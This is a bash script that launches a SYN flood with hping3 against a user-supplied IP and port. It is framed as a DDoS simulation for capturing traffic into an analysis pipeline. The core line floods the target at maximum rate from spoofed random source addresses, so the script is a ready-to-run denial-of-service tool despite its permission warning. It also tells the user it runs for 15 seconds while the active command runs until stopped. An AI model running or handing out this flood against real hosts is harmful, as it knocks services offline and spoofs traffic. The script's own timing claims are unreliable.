#!/bin/bash
# DDoS (SYN Flood) Simulation Script using hping3

# WARNING: This script can generate a high volume of traffic.
# Use only against targets you own and have permission to test on.
# Running this against a public or production server is illegal and unethical.

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null
then
    echo "[!] hping3 could not be found. Please install it."
    echo "    On Debian/Ubuntu: sudo apt-get install hping3"
    exit 1
fi

# Check if a target IP was provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip> [target_port]"
    echo "Example: $0 127.0.0.1 80"
    exit 1
fi

TARGET=$1
PORT=${2:-80} # Default to port 80 if not specified

echo "[*] Starting DDoS Simulation (SYN Flood) against $TARGET:$PORT"
echo "[*] This will run for 15 seconds. Use tcpdump or Wireshark on the target to capture traffic."
echo "[!] To stop early, press Ctrl+C."

# Run hping3 SYN flood
# -S: SYN flag
# -p: Target port
# --flood: Send packets as fast as possible, without waiting for replies.
# --rand-source: Use random source IP addresses to make it look like a distributed attack.
# -i u1000: Send every 1000 microseconds (0.001 seconds). Omit for max speed with --flood.
# We will use --flood for a high-volume attack.
# To capture this traffic for analysis, you would run something like:
# sudo tcpdump -i <interface> -w logs/ddos_capture.pcap 'host <target_ip> and port <port>'

sudo hping3 -S -p $PORT --flood --rand-source $TARGET

# Note: --flood runs indefinitely until stopped. For a timed attack, you can use `timeout`.
# Example for a 15-second attack:
# echo "[*] Running SYN flood for 15 seconds..."
# sudo timeout 15s hping3 -S -p $PORT --flood --rand-source $TARGET
# echo "[✔] 15-second DDoS simulation finished."

echo "[✔] DDoS simulation stopped."
echo "[i] Captured traffic (e.g., via tcpdump) would need to be parsed and sent to the pipeline."
